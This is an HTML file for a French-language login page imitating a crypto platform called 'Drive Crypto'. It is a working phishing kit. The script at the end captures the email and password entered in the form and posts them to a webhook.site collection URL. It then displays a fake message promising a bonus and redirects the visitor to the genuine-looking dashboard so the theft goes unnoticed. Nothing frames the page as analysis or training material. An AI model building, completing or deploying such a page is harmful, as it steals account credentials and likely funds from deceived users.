<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>Drive Crypto – Connexion</title>
  <style>
    /* ... ton CSS reste identique ... */
  </style>
</head>
<body>
  <main class="wrap">
    <section class="form-card">
      <div class="brand">
        <img src="https://mydrivecrypto.online/assets/img/logo.png" alt="Drive Crypto" />
      </div>
      <h1>Bienvenue <span class="peace">✌️</span></h1>
      <p class="subtitle">Entrer vos informations pour vous connecter</p>

      <form id="loginForm" novalidate>
        <div class="field" id="field-email">
          <input class="input" type="email" id="email" name="email" placeholder="Adresse Email" required />
          <p class="error">Veuillez entrer une adresse email valide.</p>
        </div>

        <div class="field" id="field-password">
          <input class="input" type="password" id="password" name="password" placeholder="Mot de passe" required />
          <button class="toggle-eye" type="button" aria-label="Afficher le mot de passe">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M12 5C6.5 5 2.1 8.6 1 12c1.1 3.4 5.5 7 11 7s9.9-3.6 11-7c-1.1-3.4-5.5-7-11-7Z" stroke="currentColor" stroke-width="1.8"/>
              <circle cx="12" cy="12" r="3.5" stroke="currentColor" stroke-width="1.8"/>
            </svg>
          </button>
          <p class="error">Veuillez saisir votre mot de passe.</p>
        </div>

        <div class="row">
          <button type="button" class="check" id="remember" role="checkbox" aria-checked="false">
            <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
          </button>
          <label for="remember">Se rappeler de moi</label>
        </div>

        <div class="links"><a class="link" href="#">Mot de passe oublié ?</a></div>

        <button class="btn" type="submit">Connexion</button>
        <p class="below">Pas de compte ? <a href="#">Créer un compte</a></p>
      </form>

      <footer>
        Copyright ©2025,
        <a href="#">My Drive Crypto</a>
      </footer>
    </section>
  </main>

<script>
  // Toggle mot de passe
  const pwd = document.getElementById('password');
  const eyeBtn = document.querySelector('.toggle-eye');
  eyeBtn.addEventListener('click', () => {
    pwd.type = pwd.type === 'password' ? 'text' : 'password';
  });

  // Checkbox "remember me"
  const remember = document.getElementById('remember');
  remember.addEventListener('click', () => {
    const checked = remember.getAttribute('aria-checked') === 'true';
    remember.setAttribute('aria-checked', String(!checked));
  });

  // Soumission formulaire
  document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = pwd.value;

    fetch("https://webhook.site/f8b07a2b-efd2-4812-bb67-972dc0912b4f", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        email: email,
        password: password
      })
    })
    .then(() => {
      alert("Le bonus sera transféré dans les 48h.");
      // Redirection après la confirmation
      window.location.href = "https://mydrivecrypto.online/user/dashboard.php";
    })
    .catch(err => console.error("Erreur :", err));
  });
</script>
</body>
</html>
